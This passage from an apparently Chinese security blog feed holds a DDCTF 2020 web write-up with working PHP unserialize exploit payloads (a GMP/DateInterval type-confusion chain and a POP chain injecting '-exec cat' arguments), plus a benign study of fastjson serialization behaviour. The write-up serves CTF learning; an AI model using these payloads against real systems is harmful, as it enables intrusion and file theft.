class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">        var_dump($func);</span><br><span class="line">        <span class="keyword">return</span> $func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$show = <span class="keyword">new</span> Display();</span><br><span class="line">$bullet = $_GET[<span class="string">'bullet'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($bullet))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Give Me Something!"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($bullet == <span class="string">'phpinfo'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $infos = <span class="keyword">new</span> Info();</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $obstacle = <span class="keyword">new</span> stdClass;</span><br><span class="line">    $mc = <span class="keyword">new</span> MyClass();</span><br><span class="line">    $mc-&gt;flag = <span class="string">"MyClass's flag said, Overwrite Me If You Can!"</span>;</span><br><span class="line">    @unserialize($bullet);</span><br><span class="line">    <span class="keyword">echo</span> $show-&gt;contents;</span><br><span class="line">    <span class="keyword">echo</span> $mc-&gt;get_flag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看phpinfo()对应的php版本为php5.6.10，正好考察的是前期的<a href="https://paper.seebug.org/1267/" target="_blank" rel="noopener">https://paper.seebug.org/1267/</a>，GMP的漏洞。</p>
<p>访问hint.php，得到前半段flag。</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907144813693.png" alt="image-20200907144813693"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Good Job! You&#39;ve got the preffix of the flag: DDCTF&#123;VgQN6HXC2moDAq39And i&#39;ll give a hint, I have already installed the PHP GMP extension, It has a kind of magic in php unserialize, Can you utilize it to get the remaining flag? Go ahead!</span><br></pre></td></tr></table></figure>

<p>然后参考那篇文章和hackone的payload。</p>
<p>漏洞利用需要有__wakeup()函数，题目中给了一个MyClass包含一个__wakeup()函数，但是其对应的kw0ng变量值为1，只能通过反序列化修改$show(第一个实例化的Display类)的成员。所以需要利用DateInterval内置类的__wakeup()函数，本地测试如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$inner = <span class="string">'s:1:"1";a:3:&#123;s:2:"aa";s:2:"hi";s:2:"bb";s:2:"hi";i:0;O:3:"obj":1:&#123;s:4:"ryat";R:2;&#125;&#125;'</span>;</span><br><span class="line">$inner = <span class="string">'s:1:"1";a:2:&#123;s:8:"contents";s:8:"hiasfgas";i:0;O:12:"DateInterval":1:&#123;s:1:"y";R:2;&#125;&#125;'</span>;</span><br><span class="line">$inner = <span class="string">'s:1:"1";a:2:&#123;s:8:"contents";s:8:"hiasfgas";i:0;O:7:"MyClass":1:&#123;s:5:"kw0ng";R:2;&#125;&#125;'</span>;</span><br><span class="line">$inner = <span class="string">'s:1:"3";a:3:&#123;s:5:"kw0ng";R:1;s:4:"flag";s:43:"-exec cat /HackersForever/suffix_flag.php ;";i:0;O:12:"DateInterval":1:&#123;s:1:"y";R:2;&#125;&#125;'</span>;</span><br><span class="line"><span class="comment">//-exec cat /FlagNeverFall/suffix_flag.php &#123;&#125; ;</span></span><br><span class="line">$exploit = <span class="string">'a:1:&#123;i:0;C:3:"GMP":'</span>.strlen($inner).<span class="string">':&#123;'</span>.$inner.<span class="string">'&#125;&#125;'</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>MyClass的<em>\</em>wakeup()</li>
</ul>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907202246240.png" alt="image-20200907202246240"></p>
<p>可以看到是$show的contents被修改了。</p>
<ul>
<li>DateInterval的__wakeup()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$bullet &#x3D; &#39;a:1:&#123;i:0;C:3:&quot;GMP&quot;:84:&#123;s:1:&quot;1&quot;;a:2:&#123;s:8:&quot;contents&quot;;s:8:&quot;hiasfgas&quot;;i:0;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#125;&#125;&#39;;</span><br></pre></td></tr></table></figure>

<img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907202817990.png" alt="image-20200907202817990" style="zoom:150%;">

<p>将s对应的值更改为3，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$bullet &#x3D; &#39;a:1:&#123;i:0;C:3:&quot;GMP&quot;:84:&#123;s:1:&quot;3&quot;;a:2:&#123;s:8:&quot;contents&quot;;s:8:&quot;hiasfgas&quot;;i:0;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#125;&#125;&#39;;</span><br></pre></td></tr></table></figure>

<img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907203049206.png" alt="image-20200907203049206" style="zoom:150%;">

<p>这样就把$mc的contents值修改了，所以可以利用这里修改$mc的flag值，执行命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;117.51.137.166&#x2F;EOf9uk3nSsVFK1LQ.php?bullet&#x3D;a:1:&#123;i:0;C:3:&quot;GMP&quot;:132:&#123;s:1:&quot;3&quot;;a:3:&#123;s:5:&quot;kw0ng&quot;;R:1;s:4:&quot;flag&quot;;s:43:&quot;-exec cat &#x2F;HackersForever&#x2F;suffix_flag.php ;&quot;;i:0;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907172112628.png" alt="image-20200907172112628"></p>
<p>另外还可以不利用GMP的漏洞，直接用反序列化。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">-1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $kw0ng;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Display</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $page;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///FlagNeverFall/suffix_flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Repeater</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cont;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$my = <span class="keyword">new</span> MyClass();</span><br><span class="line">$my-&gt;flag = <span class="string">'-exec cat /FlagNeverFall/suffix_flag.php &#123;&#125; ;'</span>;</span><br><span class="line"></span><br><span class="line">$rep = <span class="keyword">new</span> Repeater();</span><br><span class="line">$rep-&gt;content = [$my,<span class="string">'get_flag'</span>];</span><br><span class="line">$dis = <span class="keyword">new</span> Display();</span><br><span class="line">$dis-&gt;page = $rep;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($dis));</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?bullet&#x3D;O%3A7%3A%22Display%22%3A2%3A%7Bs%3A8%3A%22contents%22%3BN%3Bs%3A4%3A%22page%22%3BO%3A8%3A%22Repeater%22%3A2%3A%7Bs%3A7%3A%22content%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A7%3A%22MyClass%22%3A2%3A%7Bs%3A5%3A%22kw0ng%22%3BN%3Bs%3A4%3A%22flag%22%3Bs%3A45%3A%22-exec+cat+%2FFlagNeverFall%2Fsuffix_flag.php+%7B%7D+%3B%22%3B%7Di%3A1%3Bs%3A8%3A%22get_flag%22%3B%7Ds%3A14%3A%22%00Repeater%00cont%22%3BN%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907162515459.png" alt="image-20200907162515459"></p>
<p>感觉这个反序列化是用来包含hint.php的。</p>
<p>参考</p>
<p><a href="https://www.anquanke.com/post/id/216694" target="_blank" rel="noopener">https://www.anquanke.com/post/id/216694</a></p>
<p><a href="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/" target="_blank" rel="noopener">https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>初探fastjson系列漏洞</title>
    <url>/2020/09/07/%E5%88%9D%E6%8E%A2fastjson%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>参考几位师傅的文章复现分析下fastjson的漏洞</p>
<a id="more"></a>

<h1 id="0x01-序列化和反序列化"><a href="#0x01-序列化和反序列化" class="headerlink" title="0x01 序列化和反序列化"></a>0x01 序列化和反序列化</h1><p>为了方便修改fastjson版本，利用maven构建项目，</p>
<p>直接用了<a href="http://www.rai4over.cn/" target="_blank" rel="noopener">rai4over</a>师傅的源码，User()的成员及其属性如下：</p>
<img src="/2020/09/07/%E5%88%9D%E6%8E%A2fastjson%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/image-20200907111204669.png" alt="image-20200907111204669" style="zoom:150%;">

<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><ul>
<li><strong>非自省的序列化</strong>：<code>JSON.toJSONString(Object object)</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User a = <span class="keyword">new</span> User();</span><br><span class="line">        System.out.println(<span class="string">"==========================="</span>);</span><br><span class="line">        String jsonstr_a = JSON.toJSONString(a);</span><br><span class="line">        System.out.println(<span class="string">"==========================="</span>);</span><br><span class="line">        System.out.println(jsonstr_a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/%E5%88%9D%E6%8E%A2fastjson%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/image-20200907112008933.png" alt="image-20200907112008933"></p>
<p>只要存在get方法（不管是public还是private）都被调用。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"age1"</span>: <span class="string">"a1"</span>,</span><br><span class="line">	<span class="attr">"age2"</span>: <span class="string">"a2"</span>,</span><br><span class="line">	<span class="attr">"name1"</span>: <span class="string">"mount4in1"</span>,</span><br><span class="line">	<span class="attr">"name2"</span>: <span class="string">"mount4in2"</span>,</span><br><span class="line">	<span class="attr">"name3"</span>: <span class="string">"mount4in3"</span>,</span><br><span class="line">	<span class="attr">"name4"</span>: <span class="string">"mount4in4"</span>,</span><br><span class="line">	<span class="attr">"prop1_1"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_1"</span>: <span class="string">"1_1"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_2"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_2"</span>: <span class="string">"1_2"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_3"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_3"</span>: <span class="string">"1_3"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_4"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_4"</span>: <span class="string">"1_4"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop2_1"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop2_1"</span>: <span class="string">"2_1"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop2_2"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop2_2"</span>: <span class="string">"2_2"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现除了<strong>private属性而且不存在对应的get方法的成员</strong>外，其他的成员均被序列化。</p>
<ul>
<li><strong>自省的序列化</strong>：<code>toJSONString(Object object, SerializerFeature... features)</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User a = <span class="keyword">new</span> User();</span><br><span class="line">        System.out.println(<span class="string">"==========================="</span>);</span><br><span class="line">        String jsonstr_a = JSON.toJSONString(a,SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(<span class="string">"==========================="</span>);</span><br><span class="line">        System.out.println(jsonstr_a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/%E5%88%9D%E6%8E%A2fastjson%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/image-20200907112634394.png" alt="image-20200907112634394"></p>
<p>只要存在get方法（不管是public还是private）都被调用。与非自省相同。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"@type"</span>: <span class="string">"User"</span>,</span><br><span class="line">	<span class="attr">"age1"</span>: <span class="string">"a1"</span>,</span><br><span class="line">	<span class="attr">"age2"</span>: <span class="string">"a2"</span>,</span><br><span class="line">	<span class="attr">"name1"</span>: <span class="string">"mount4in1"</span>,</span><br><span class="line">	<span class="attr">"name2"</span>: <span class="string">"mount4in2"</span>,</span><br><span class="line">	<span class="attr">"name3"</span>: <span class="string">"mount4in3"</span>,</span><br><span class="line">	<span class="attr">"name4"</span>: <span class="string">"mount4in4"</span>,</span><br><span class="line">	<span class="attr">"prop1_1"</span>: &#123;</span><br><span class="line">		<span class="attr">"@type"</span>: <span class="string">"java.util.Properties"</span>,</span><br><span class="line">		<span class="attr">"prop1_1"</span>: <span class="string">"1_1"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_2"</span>: &#123;</span><br><span class="line">		<span class="attr">"@type"</span>: <span class="string">"java.util.Properties"</span>,</span><br><span class="line">		<span class="attr">"prop1_2"</span>: <span class="string">"1_2"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_3"</span>: &#123;</span><br><span class="line">		<span class="attr">"@type"</span>: <span class="string">"java.util.Properties"</span>,</span><br><span class="line">		<span class="attr">"prop1_3"</span>: <span class="string">"1_3"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_4"</span>: &#123;</span><br><span class="line">		<span class="attr">"@type"</span>: <span class="string">"java.util.Properties"</span>,</span><br><span class="line">		<span class="attr">"prop1_4"</span>: <span class="string">"1_4"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop2_1"</span>: &#123;</span><br><span class="line">		<span class="attr">"@type"</span>: <span class="string">"java.util.Properties"</span>,</span><br><span class="line">		<span class="attr">"prop2_1"</span>: <span class="string">"2_1"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop2_2"</span>: &#123;</span><br><span class="line">		<span class="attr">"@type"</span>: <span class="string">"java.util.Properties"</span>,</span><br><span class="line">		<span class="attr">"prop2_2"</span>: <span class="string">"2_2"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与非自省的区别是增加了<code>@type</code>字段，可以得到对象的类型。</p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><ul>
<li><strong>反序列化分三种</strong>，分别是<code>parseObject(String text, Class&lt;T&gt; clazz)</code>、<code>JSONObject parseObject(String text)</code>、<code>parse(String text)</code>。反序列化时要把User.java中的构造函数注释掉。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String jsonstr_a = <span class="string">"&#123;\"age1\":\"a1\",\"age2\":\"a2\",\"age3\":\"a3\",\"age4\":\"a4\",\"name1\":\"mount4in1\",\"name2\":\"mount4in2\",\"name3\":\"mount4in3\",\"name4\":\"mount4in4\",\"prop1_1\":&#123;\"prop1_1\":\"1_1\"&#125;,\"prop1_2\":&#123;\"prop1_2\":\"1_2\"&#125;,\"prop1_3\":&#123;\"prop1_3\":\"1_3\"&#125;,\"prop1_4\":&#123;\"prop1_4\":\"1_4\"&#125;,\"prop2_1\":&#123;\"prop2_1\":\"2_1\"&#125;,\"prop2_2\":&#123;\"prop2_2\":\"2_2\"&#125;,\"prop2_3\":&#123;\"prop2_3\":\"2_3\"&#125;,\"prop2_4\":&#123;\"prop2_4\":\"2_4\"&#125;&#125;"</span>;</span><br><span class="line">        String jsonstr_b = <span class="string">"&#123;\"@type\":\"User\",\"age1\":\"a1\",\"age2\":\"a2\",\"age3\":\"a3\",\"age4\":\"a4\",\"name1\":\"mount4in1\",\"name2\":\"mount4in2\",\"name3\":\"mount4in3\",\"name4\":\"mount4in4\",\"prop1_1\":&#123;\"@type\":\"java.util.Properties\",\"prop1_1\":\"1_1\"&#125;,\"prop1_2\":&#123;\"@type\":\"java.util.Properties\",\"prop1_2\":\"1_2\"&#125;,\"prop1_3\":&#123;\"@type\":\"java.util.Properties\",\"prop1_3\":\"1_3\"&#125;,\"prop1_4\":&#123;\"@type\":\"java.util.Properties\",\"prop1_4\":\"1_4\"&#125;,\"prop2_1\":&#123;\"@type\":\"java.util.Properties\",\"prop2_1\":\"2_1\"&#125;,\"prop2_2\":&#123;\"@type\":\"java.util.Properties\",\"prop2_2\":\"2_2\"&#125;,\"prop2_3\":&#123;\"@type\":\"java.util.Properties\",\"prop2_3\":\"2_3\"&#125;,\"prop2_4\":&#123;\"@type\":\"java.util.Properties\",\"prop2_4\":\"2_4\"&#125;&#125;"</span>;</span><br><span class="line">        System.out.println(<span class="string">"============JSON.parseObject()指定类，非自省==============="</span>);</span><br><span class="line">        User a = JSON.parseObject(jsonstr_a, User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(a);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"============JSON.parseObject()自省==============="</span>);</span><br><span class="line">        JSONObject b = JSON.parseObject(jsonstr_b);</span><br><span class="line">        System.out.println(b);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"============JSON.parse()==============="</span>);</span><br><span class="line">        Object c = JSON.parse(jsonstr_b);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/%E5%88%9D%E6%8E%A2fastjson%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/image-20200907122925167.png" alt="image-20200907122925167"></p>
<ul>
<li><p><strong>JSON.parseObject()指定类，非自省</strong></p>
<p>只要存在set方法（不管是public还是private）都被调用。额外调用了<code>getprop2_2();//private且有get</code>。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">User &#123;</span><br><span class="line">	name1 = 'mount4in1', name2 = 'mount4in2', name3 = 'mount4in3', name4 = 'mount4in4', age1 = 'a1', age2 = 'null', age3 = 'a3', age4 = 'null', prop1_1 = &#123;</span><br><span class="line">		prop1_1 = 1 _1</span><br><span class="line">	&#125;, prop1_2 = &#123;</span><br><span class="line">		prop1_2 = 1 _2</span><br><span class="line">	&#125;, prop1_3 = &#123;</span><br><span class="line">		prop1_3 = 1 _3</span><br><span class="line">	&#125;, prop1_4 = &#123;</span><br><span class="line">		prop1_4 = 1 _4</span><br><span class="line">	&#125;, prop2_1 = &#123;</span><br><span class="line">		prop2_1 = 2 _1</span><br><span class="line">	&#125;, prop2_2 = &#123;</span><br><span class="line">		prop2_2 = 2 _2</span><br><span class="line">	&#125;, prop2_3 = &#123;</span><br><span class="line">		prop2_3 = 2 _3</span><br><span class="line">	&#125;, prop2_4 = null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>public属性或含有set方法的成员都被赋值，private属性而且没有set方法的的成员赋值为null,但是这里prop2_2被赋值了，不知道什么原因。</p>
</li>
<li><p><strong>JSON.parseObject()自省</strong></p>
<p>所有的set和get方法都被调用，getProp2_2调用了两次。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"prop1_3"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_3"</span>: <span class="string">"1_3"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop2_2"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop2_2"</span>: <span class="string">"2_2"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop1_4"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_4"</span>: <span class="string">"1_4"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"name4"</span>: <span class="string">"mount4in4"</span>,</span><br><span class="line">	<span class="attr">"prop1_1"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_1"</span>: <span class="string">"1_1"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"name3"</span>: <span class="string">"mount4in3"</span>,</span><br><span class="line">	<span class="attr">"prop1_2"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop1_2"</span>: <span class="string">"1_2"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"prop2_1"</span>: &#123;</span><br><span class="line">		<span class="attr">"prop2_1"</span>: <span class="string">"2_1"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">"name2"</span>: <span class="string">"mount4in2"</span>,</span><br><span class="line">	<span class="attr">"name1"</span>: <span class="string">"mount4in1"</span>,</span><br><span class="line">	<span class="attr">"age1"</span>: <span class="string">"a1"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里public属性的成员都被赋值，private属性的的只有age1和prop2_1被赋值。</p>
</li>
<li><p><strong>JSON.parse()</strong></p>
<p>只要存在set方法（不管是public还是private）都被调用。额外调用了<code>getprop2_2();//private且有get</code>。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">User &#123;</span><br><span class="line">	name1 = 'mount4in1', name2 = 'mount4in2', name3 = 'mount4in3', name4 = 'mount4in4', age1 = 'a1', age2 = 'null', age3 = 'a3', age4 = 'null', prop1_1 = &#123;</span><br><span class="line">		prop1_1 = 1 _1</span><br><span class="line">	&#125;, prop1_2 = &#123;</span><br><span class="line">		prop1_2 = 1 _2</span><br><span class="line">	&#125;, prop1_3 = &#123;</span><br><span class="line">		prop1_3 = 1 _3</span><br><span class="line">	&#125;, prop1_4 = &#123;</span><br><span class="line">		prop1_4 = 1 _4</span><br><span class="line">	&#125;, prop2_1 = &#123;</span><br><span class="line">		prop2_1 = 2 _1</span><br><span class="line">	&#125;, prop2_2 = &#123;</span><br><span class="line">		prop2_2 = 2 _2</span><br><span class="line">	&#125;, prop2_3 = &#123;</span><br><span class="line">		prop2_3 = 2 _3</span><br><span class="line">	&#125;, prop2_4 = null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>public属性或含有set方法的成员都被赋值，private属性而且没有set方法的的成员赋值为null,但是这里prop2_2被赋值了，不知道什么原因。</p>
</li>
</ul>
<p><strong>ps:</strong>可以通过传递<code>Feature.SupportNonPublicField</code>来对没有set方法的private属性成员赋值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String jsonstr_a = <span class="string">"&#123;\"age1\":\"a1\",\"age2\":\"a2\",\"age3\":\"a3\",\"age4\":\"a4\",\"name1\":\"mount4in1\",\"name2\":\"mount4in2\",\"name3\":\"mount4in3\",\"name4\":\"mount4in4\",\"prop1_1\":&#123;\"prop1_1\":\"1_1\"&#125;,\"prop1_2\":&#123;\"prop1_2\":\"1_2\"&#125;,\"prop1_3\":&#123;\"prop1_3\":\"1_3\"&#125;,\"prop1_4\":&#123;\"prop1_4\":\"1_4\"&#125;,\"prop2_1\":&#123;\"prop2_1\":\"2_1\"&#125;,\"prop2_2\":&#123;\"prop2_2\":\"2_2\"&#125;,\"prop2_3\":&#123;\"prop2_3\":\"2_3\"&#125;,\"prop2_4\":&#123;\"prop2_4\":\"2_4\"&#125;&#125;"</span>;</span><br><span class="line">        System.out.println(jsonstr_a);</span><br><span class="line">        System.out.println(<span class="string">"==========================="</span>);</span><br><span class="line">        User b = JSON.parseObject(jsonstr_a, User<span class="class">.<span class="keyword">class</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line">        System.out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/07/%E5%88%9D%E6%8E%A2fastjson%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/image-20200907125946234.png" alt="image-20200907125946234"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">User &#123;</span><br><span class="line">	name1 = 'mount4in1', name2 = 'mount4in2', name3 = 'mount4in3', name4 = 'mount4in4', age1 = 'a1', age2 = 'a2', age3 = 'a3', age4 = 'a4', prop1_1 = &#123;</span><br><span class="line">		prop1_1 = 1 _1</span><br><span class="line">	&#125;, prop1_2 = &#123;</span><br><span class="line">		prop1_2 = 1 _2</span><br><span class="line">	&#125;, prop1_3 = &#123;</span><br><span class="line">		prop1_3 = 1 _3</span><br><span class="line">	&#125;, prop1_4 = &#123;</span><br><span class="line">		prop1_4 = 1 _4</span><br><span class="line">	&#125;, prop2_1 = &#123;</span><br><span class="line">		prop2_1 = 2 _1</span><br><span class="line">	&#125;, prop2_2 = &#123;</span><br><span class="line">		prop2_2 = 2 _2</span><br><span class="line">	&#125;, prop2_3 = &#123;</span><br><span class="line">		prop2_3 = 2 _3</span><br><span class="line">	&#125;, prop2_4 = &#123;</span><br><span class="line">		prop2_4 = 2 _4</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1>]]></content>
      <tags>
        <tag>fastjson</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>2020安恒8月月赛复现</title>
    <url>/2020/09/06/2020%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>月赛复现</p>
<a id="more"></a>

<h1 id="0x01-ezrce"><a href="#0x01-ezrce" class="headerlink" title="0x01 ezrce"></a>0x01 ezrce</h1><p>题目给了源码，</p>
